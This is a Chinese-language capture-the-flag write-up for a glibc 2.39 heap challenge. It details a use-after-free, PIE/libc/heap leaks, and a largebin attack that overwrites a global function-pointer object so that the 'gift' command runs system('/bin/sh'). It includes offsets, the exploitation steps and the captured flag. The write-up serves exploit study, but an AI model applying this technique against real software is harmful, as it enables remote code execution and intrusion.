# Large

## 题目简述

题目是 Ubuntu 24.04 / glibc 2.39 环境下的堆菜单题。服务会把 flag 写入 `/flag` 后以普通用户启动，程序提供 `add/show/edit/delete/gift/exit` 操作，`idx` 只能取 `1~15`，申请大小被限制在 `0x501~0x5ff`，所有可控 chunk 都落入 largebin 相关范围。

程序保护如下：

| 保护 | 状态 |
|---|---|
| RELRO | Full RELRO |
| Canary | Enabled |
| NX | Enabled |
| PIE | Enabled |
| SHSTK | Enabled |
| IBT | Enabled |

程序保护包含 Full RELRO、Canary、NX、PIE、SHSTK 和 IBT，基本排除了传统 GOT 覆写与直接栈 ROP。关键机制是 `delete` 后没有清空指针形成 UAF，`gift` 可泄漏 PIE 地址，largebin 元数据可进一步泄漏 libc/heap 并改写全局函数对象，最终把 `gift` 调用导向 `system("/bin/sh")`。

## 解题过程

### 程序逻辑

程序是一个简单的堆菜单：

```text
add <idx> <size>
show <idx>
edit <idx>
delete <idx>
gift
exit
```

其中：

- `idx` 只能取 `1~15`
- `size` 只能取 `0x501~0x5ff`
- `chunks[16]` 保存堆指针
- `chunk_size[16]` 保存申请长度

程序还维护了一个全局对象 `f` 与全局指针 `g_f`：

```c
struct gift_obj
{
    ...
    void (*func)(...);   // +0x10
    char *arg1;          // +0x18
    void *arg2;          // +0x20
};
```

初始化后，`g_f` 指向 `f`，而 `f` 中保存的是：

```c
func = printf
arg1 = "%p\n"
arg2 = &g_f
```

因此执行 `gift` 时，实际调用等价于：

```c
printf("%p\n", &g_f);
```

这会直接泄露 PIE 地址：

```python
pie_base = gift_leak - 0x40a0
```

### 漏洞点

### 1. UAF

`delete` 只执行了：

```c
free(chunks[idx]);
```

却没有把指针清空，因此删除后仍然可以继续：

- `show idx`
- `edit idx`

这就是标准的 Use-After-Free。

### 2. largebin 元数据可控

由于所有申请都落在 largebin 范围内，释放后的 chunk 会进入 unsorted bin，随后在新的更大申请中被整理进 largebin。

利用步骤如下：

```text
add 1 1408     # 0x580
add 2 1281     # 防止与 top chunk 合并
add 3 1392     # 0x570
add 4 1281     # 防止与 top chunk 合并

delete 1
add 5 1520     # 0x5f0，大于 chunk1，使 chunk1 被整理进 largebin
show 1
```

此时 `show 1` 可以泄露 largebin 中的元数据：

- 第 1 个 qword（fd）：`libc_base + 0x203f70`（指向 main_arena 中的 bins 头）
- 第 3 个 qword（fd_nextsize）：`heap_base + 0x290`

于是：

```python
libc_base = libc_leak - 0x203f70
heap_base = heap_leak - 0x290
```

### 利用思路

本题的关键不是去改 GOT，而是把 `g_f` 改成指向我们可控的 chunk。

### largebin attack 原理

largebin 插入过程中有一条关键写入：

```c
victim->bk_nextsize->fd_nextsize = victim;
```

而 `fd_nextsize` 字段位于 chunk header 偏移 `0x20`。  
因此，如果把某个已在 largebin 中的 chunk 的：

```c
bk_nextsize = g_f - 0x20
```

那么后续插入新的 largebin chunk 时，就会发生：

```c
*(g_f) = victim;
```

这会将 `g_f` 覆写为新插入 chunk 的地址（即 victim chunk header 地址）。

### 具体做法

先把 `chunk1` 放入 largebin，然后通过 UAF 修改其元数据：

```python
chunk1->bk_nextsize = g_f - 0x20
```

随后：

```text
delete 3
add 6 1520
```

把更小的 `chunk3` 插入 largebin，触发 largebin attack。  
触发后：

```c
g_f = chunk3_header;
```

### gift 劫持

这一步非常巧妙，因为 `gift` 访问的是：

- `g_f + 0x10` → `func` 函数指针
- `g_f + 0x18` → `arg1`
- `g_f + 0x20` → `arg2`

而这些位置对于 `chunk3_header` 来说，正好对应 `chunk3` 用户区的前三个 qword。  
于是只需要再利用 UAF：

```text
edit 3
```

写入：

```python
[ system ][ "/bin/sh" ][ 0 ]
```

最终再次执行：

```text
gift
```

程序就会调用：

```c
system("/bin/sh");
```

### 关键偏移

| 名称 | 偏移 |
|---|---:|
| `g_f` | `0x40a0` |
| `f` | `0x4020` |
| largebin libc leak | `0x203f70` |
| heap leak | `0x290` |
| `system` | `0x58750` |
| `"/bin/sh"` | `0x1cb42f` |

### 完整利用流程

```text
1. gift 泄露 PIE
2. 申请 chunk1/chunk2/chunk3/chunk4（均为 0x500+ 大小）
3. free chunk1
4. 申请更大的 chunk5（0x5f0），把 chunk1 送入 largebin
5. show chunk1 泄露 libc_base 和 heap_base
6. edit chunk1，伪造 bk_nextsize = g_f - 0x20
7. free chunk3
8. 申请更大的 chunk6（0x5f0），触发 largebin attack，把 g_f 改成 chunk3_header
9. edit chunk3，把用户区改成 [system, "/bin/sh", 0]
10. gift 触发 system("/bin/sh")，获取 shell
```

### 远程验证

```text
$ python3 exp_remote.py
[+] PIE base: 0x630523899000
[+] libc base: 0x792cccf22000
$ cat /flag
Spirit{I4RgeBin_4tt@cK_15-VERy-pOWerFul17c9c2}
```

成功获取 flag：`Spirit{I4RgeBin_4tt@cK_15-VERy-pOWerFul17c9c2}`

## 方法总结

- 核心技巧：利用 UAF 修改 largebin chunk 的 `bk_nextsize`，触发 largebin attack 覆写全局指针 `g_f`。
- 识别信号：题目限制申请 `0x501~0x5ff` 的大块、glibc 2.39、存在释放后可 show/edit 的 UAF，并提供可泄露 PIE 的函数指针对象。
- 复用要点：Full RELRO、Canary、NX、PIE 下不要执着 GOT/栈 ROP；若能把全局函数指针对象重定向到可控 chunk，可用 `[system, "/bin/sh", 0]` 直接劫持调用。
